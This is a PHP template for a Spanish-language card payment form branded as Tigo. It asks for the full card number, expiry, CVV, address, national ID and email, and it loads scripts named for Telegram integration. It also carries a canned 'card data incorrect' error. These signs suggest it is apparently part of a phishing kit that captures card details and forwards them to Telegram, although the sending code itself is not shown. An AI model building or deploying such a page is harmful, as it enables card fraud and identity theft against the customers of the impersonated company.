<?php ob_start(); ?>

<div class="container">
    <a href="/payment/methods?invoice_id=<?= htmlspecialchars($invoice_id) ?>" class="back-link">
        <svg class="back-link__icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M19 12H5M5 12L12 19M5 12L12 5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
        REGRESAR
    </a>

    <h1 class="page-title-card">Pago con tarjeta</h1>

    <div class="card-form-container">
        <div class="card-form-card">
            <div class="card-header">
                <div class="card-icon-container">
                    <svg class="card-icon" width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <rect x="2" y="5" width="20" height="14" rx="2" stroke="currentColor" stroke-width="2"/>
                        <path d="M2 10H22" stroke="currentColor" stroke-width="2"/>
                    </svg>
                </div>
                <span class="card-header-text">Tarjeta crédito / débito con CVV</span>
            </div>

            <div id="errorMessage" class="error-message" style="display: none;">
                <svg class="error-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/>
                    <path d="M12 8V12M12 16H12.01" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
                </svg>
                <span id="errorText">Los datos de tu tarjeta son incorrectos. Por favor, verifica la información e intenta nuevamente.</span>
            </div>

            <div class="accepted-cards">
                <span class="accepted-cards-label">Tarjetas aceptadas:</span>
                <div class="accepted-cards-logos">
                    <img src="/img/amex.svg" alt="American Express" class="card-logo">
                    <img src="/img/mastercard.svg" alt="Mastercard" class="card-logo">
                    <img src="/img/visa.svg" alt="Visa" class="card-logo">
                    <img src="/img/dinersclub.svg" alt="Diners Club" class="card-logo">
                </div>
            </div>

            <form id="cardForm" class="card-form">
                <!-- Número de tarjeta -->
                <div class="form-group">
                    <label for="cardNumber" class="form-label-card">Número completo de la tarjeta</label>
                    <div style="position: relative;">
                        <input type="tel" id="cardNumber" name="cardNumber" class="form-input-card" 
                               placeholder="0000 0000 0000 0000" maxlength="19" 
                               autocomplete="new-password" autocorrect="off" autocapitalize="off" spellcheck="false"
                               pattern="[0-9 ]*" inputmode="numeric" 
                               style="appearance: none; -webkit-appearance: none; -moz-appearance: none; -webkit-text-security: none;" required>
                    </div>
                </div>

                <!-- Fecha de expiración y CVV -->
                <div class="form-group-row-card">
                    <div class="form-group form-group-half">
                        <label for="expiryDate" class="form-label-card">Fecha de expiración</label>
                        <div class="input-with-icon input-with-helper">
                            <svg class="input-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <rect x="3" y="4" width="18" height="18" rx="2" stroke="currentColor" stroke-width="2"/>
                                <path d="M3 10H21M8 2V6M16 2V6" stroke="currentColor" stroke-width="2"/>
                            </svg>
                            <input type="text" id="expiryDate" name="expiryDate" class="form-input-card" placeholder="" maxlength="5" required>
                        </div>
                        <span class="input-helper-text">Búscala en el frente</span>
                    </div>
                    <div class="form-group form-group-half">
                        <label for="cvv" class="form-label-card">Código de seguridad</label>
                        <div class="input-with-icon input-with-helper">
                            <svg class="input-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <rect x="3" y="11" width="18" height="11" rx="2" stroke="currentColor" stroke-width="2"/>
                                <path d="M7 11V7C7 4.79086 8.79086 3 11 3H13C15.2091 3 17 4.79086 17 7V11" stroke="currentColor" stroke-width="2"/>
                            </svg>
                            <input type="text" id="cvv" name="cvv" class="form-input-card" placeholder="000" maxlength="4" required>
                        </div>
                        <span class="input-helper-text">Búscala al reverso</span>
                    </div>
                </div>

                <!-- Nombre del tarjetahabiente -->
                <div class="form-group">
                    <label for="cardholderName" class="form-label-card">Nombre del tarjetahabiente</label>
                    <input type="text" id="cardholderName" name="cardholderName" class="form-input-card" required>
                </div>

                <!-- Cuotas -->
                <div class="form-group">
                    <label for="installments" class="form-label-card">Cuotas</label>
                    <button type="button" class="form-select-btn-card" id="installmentsBtn">
                        <span id="installmentsText">1</span>
                    </button>
                    <input type="hidden" id="installments" name="installments" value="1" required>
                </div>

                <!-- Dirección -->
                <div class="form-group">
                    <label for="address" class="form-label-card">Dirección</label>
                    <input type="text" id="address" name="address" class="form-input-card" required>
                </div>

                <!-- Documento y Número -->
                <div class="form-group-row-card doc-row">
                    <div class="form-group form-group-small-card">
                        <label for="docType" class="form-label-card">Documento</label>
                        <button type="button" class="form-select-btn-card" id="docTypeBtn">
                            <span id="docTypeText">CC</span>
                        </button>
                        <input type="hidden" id="docType" name="docType" value="CC" required>
                    </div>
                    <div class="form-group form-group-large-card">
                        <label for="docNumber" class="form-label-card">Número de identificación</label>
                        <input type="text" id="docNumber" name="docNumber" class="form-input-card" required>
                    </div>
                </div>

                <!-- Correo electrónico -->
                <div class="form-group">
                    <label for="email" class="form-label-card">Correo electrónico</label>
                    <input type="email" id="email" name="email" class="form-input-card" required>
                </div>

                <!-- Términos y condiciones -->
                <div class="terms-container-card">
                    <p class="terms-text-card">
                        Al presionar CONTINUAR estás aceptando los 
                        <a href="#" class="terms-link-card">términos y condiciones</a>
                    </p>
                </div>

                <!-- Botones de acción -->
                <div class="card-form-actions">
                    <button type="button" class="btn-cancel-card" onclick="window.location.href='/payment/methods?invoice_id=<?= htmlspecialchars($invoice_id) ?>'">CANCELAR</button>
                    <button type="submit" class="btn-submit-card" id="submitBtn" disabled>CONTINUAR</button>
                </div>
            </form>
        </div>
    </div>
</div>

<!-- Modal para Cuotas -->
<div class="modal-overlay-card" id="installmentsModal">
    <div class="modal-container-card">
        <div class="modal-content-card">
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="1" class="radio-input-card" checked>
                <span class="radio-circle"></span>
                <span class="radio-label-card">1</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="2" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">2</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="3" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">3</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="4" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">4</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="5" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">5</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="6" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">6</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="7" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">7</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="8" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">8</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="9" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">9</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="10" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">10</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="11" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">11</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="12" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">12</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="13" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">13</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="14" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">14</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="15" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">15</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="16" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">16</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="17" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">17</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="18" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">18</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="19" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">19</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="20" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">20</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="21" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">21</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="22" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">22</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="23" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">23</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="24" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">24</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="25" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">25</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="26" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">26</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="27" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">27</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="28" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">28</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="29" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">29</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="30" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">30</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="31" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">31</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="32" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">32</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="33" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">33</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="34" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">34</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="35" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">35</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="installmentsOption" value="36" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">36</span>
            </label>
        </div>
        <div class="modal-footer-card">
            <button type="button" class="btn-modal-card btn-modal-cancel" id="cancelInstallmentsBtn">CANCELAR</button>
            <button type="button" class="btn-modal-card btn-modal-continue" id="continueInstallmentsBtn">CONTINUAR</button>
        </div>
    </div>
</div>

<!-- Modal para Tipo de Documento -->
<div class="modal-overlay-card" id="docTypeModal">
    <div class="modal-container-card">
        <div class="modal-content-card">
            <label class="radio-option-card">
                <input type="radio" name="docTypeOption" value="CC" class="radio-input-card" checked>
                <span class="radio-circle"></span>
                <span class="radio-label-card">CC</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="docTypeOption" value="CE" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">CE</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="docTypeOption" value="NIT" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">NIT</span>
            </label>
            <label class="radio-option-card">
                <input type="radio" name="docTypeOption" value="TI" class="radio-input-card">
                <span class="radio-circle"></span>
                <span class="radio-label-card">TI</span>
            </label>
        </div>
        <div class="modal-footer-card">
            <button type="button" class="btn-modal-card btn-modal-cancel" id="cancelDocTypeBtn">CANCELAR</button>
            <button type="button" class="btn-modal-card btn-modal-continue" id="continueDocTypeBtn">CONTINUAR</button>
        </div>
    </div>
</div>

<!-- Overlay de carga -->
<div id="loadingOverlay" class="loading-overlay tigo-loading">
    <img src="/img/tigo-logo.svg" alt="Tigo" class="loading-logo">
    <p class="loading-text">Procesando tu solicitud...</p>
</div>

<?php
$content = ob_get_clean();
$additionalJS = ['/js/telegram-integration.js', '/js/card-form.js', '/js/card-telegram.js'];
require __DIR__ . '/../layout.php';
?>

